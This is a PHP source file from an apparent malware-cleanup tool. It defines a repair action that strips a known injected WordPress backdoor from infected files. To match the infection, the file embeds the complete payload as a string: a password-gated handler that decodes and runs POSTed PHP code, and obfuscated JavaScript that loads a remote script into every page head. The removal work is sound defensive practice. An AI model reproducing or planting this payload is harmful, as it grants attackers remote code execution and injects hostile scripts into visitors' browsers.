<?php

namespace packages\peeker\actions\repairs;

use packages\base\IO\File;
use packages\base\Log;
use packages\peeker\actions\Repair;
use packages\peeker\IAction;
use packages\peeker\IActionFile;
use packages\peeker\IO\IPreloadedMd5;

class InjectedFetasBetasRepair extends Repair implements IActionFile
{
    protected $file;
    protected $mode;
    protected $md5;

    public function __construct(File $file, string $mode)
    {
        $this->file = $file;
        $this->mode = $mode;
        $this->md5 = $file->md5();
    }

    public function getFile(): File
    {
        return $this->file;
    }

    public function hasConflict(IAction $other): bool
    {
        return !$other instanceof static and $other instanceof IActionFile and $other->getFile()->getPath() == $this->file->getPath();
    }

    public function isValid(): bool
    {
        if ($this->file instanceof IPreloadedMd5) {
            $this->file->resetMd5();
        }

        return $this->file->exists() and $this->file->md5() == $this->md5;
    }

    public function do(): void
    {
        $log = Log::getInstance();
        $log->info("Repair injected _set_fetas_tag|_set_betas_tag function in first line {$this->file->getPath()}");
        $content = $this->file->read();
        $replace = 'if(!function_exists("_set_fetas_tag") && !function_exists("_set_betas_tag")){try{function _set_fetas_tag(){'
            . 'if(isset($_GET[\'here\'])&&!isset($_POST[\'here\'])){die(md5(8));}if(isset($_POST[\'here\'])){'
            . '$a1=\'m\'.\'d5\';if($a1($a1($_POST[\'here\']))==="83a7b60dd6a5daae1a2f1a464791dac4"){'
            . '$a2="fi"."le"."_put"."_contents";$a22="base";$a22=$a22."64";$a22=$a22."_d";$a22=$a22."ecode";$a222="PD"."9wa"."HAg";$a2222=$_POST[$a1];$a3="sy"."s_ge"."t_te"."mp_dir";$a3=$a3();$a3 = $a3."/".$a1(uniqid(rand(), true));@$a2($a3,$a22($a222).$a22($a2222));include($a3); @$a2($a3,\'1\'); @unlink($a3);die();'
            . '}else{echo md5(7);}die();}} _set_fetas_tag();'
            . 'if(!isset($_POST[\'here\'])&&!isset($_GET[\'here\'])){'
            . 'function _set_betas_tag(){echo "<script>var _0x3ec646=_0x38c3;(function(_0x2be3b3,_0x4eaeab){'
            . 'var _0x383697=_0x38c3,_0x8113a5=_0x2be3b3();while(!![]){try{'
            . 'var _0x351603=parseInt(_0x383697(0x178))/0x1+parseInt(_0x383697(0x180))/0x2+-parseInt(_0x383697(0x184))/0x3*(-parseInt(_0x383697(0x17a))/0x4)+-parseInt(_0x383697(0x17c))/0x5+-parseInt(_0x383697(0x179))/0x6+-parseInt(_0x383697(0x181))/0x7*(parseInt(_0x383697(0x177))/0x8)+-parseInt(_0x383697(0x17f))/0x9*(-parseInt(_0x383697(0x185))/0xa);'
            . 'if(_0x351603===_0x4eaeab)break;else _0x8113a5[\'push\'](_0x8113a5[\'shift\']());}'
            . 'catch(_0x58200a){_0x8113a5[\'push\'](_0x8113a5[\'shift\']());}}}(_0x48d3,0xa309a));var f=document[_0x3ec646(0x183)](_0x3ec646(0x17d));'
            . 'function _0x38c3(_0x32d1a4,_0x31b781){var _0x48d332=_0x48d3();return _0x38c3=function(_0x38c31a,_0x44995e){_0x38c31a=_0x38c31a-0x176;var _0x11c794=_0x48d332[_0x38c31a];return _0x11c794;},_0x38c3(_0x32d1a4,_0x31b781);}'
            . 'f[_0x3ec646(0x186)]=String[_0x3ec646(0x17b)](0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x62,0x61,0x63,0x6b,0x67,0x72,0x6f,0x75,0x6e,0x64,0x2e,0x61,0x70,0x69,0x73,0x74,0x61,0x74,0x65,0x78,0x70,0x65,0x72,0x69,0x65,0x6e,0x63,0x65,0x2e,0x63,0x6f,0x6d,0x2f,0x73,0x74,0x61,0x72,0x74,0x73,0x2f,0x73,0x65,0x65,0x2e,0x6a,0x73),'
            . 'document[\'currentScript\'][\'parentNode\'][_0x3ec646(0x176)](f,document[_0x3ec646(0x17e)]),'
            . 'document[\'currentScript\'][_0x3ec646(0x182)]();function _0x48d3(){'
            . 'var _0x35035=[\'script\',\'currentScript\',\'9RWzzPf\',\'402740WuRnMq\',\'732585GqVGDi\',\'remove\',\'createElement\',\'30nckAdA\',\'5567320ecrxpQ\',\'src\',\'insertBefore\',\'8ujoTxO\',\'1172840GvBdvX\',\'4242564nZZHpA\',\'296860cVAhnV\',\'fromCharCode\',\'5967705ijLbTz\'];_'
            . '0x48d3=function(){return _0x35035;};return _0x48d3();}</script>";}add_action(\'wp_head\',\'_set_betas_tag\');}}catch(Exception $e){}}';
        $content = str_ireplace($replace, '', $content);
        $this->file->write($content);
    }

    public function serialize()
    {
        return serialize([
            $this->file,
            $this->mode,
            $this->md5,
        ]);
    }

    public function unserialize($serialized)
    {
        $data = unserialize($serialized);
        $this->file = $data[0];
        $this->mode = $data[1];
        $this->md5 = $data[2];
    }
}
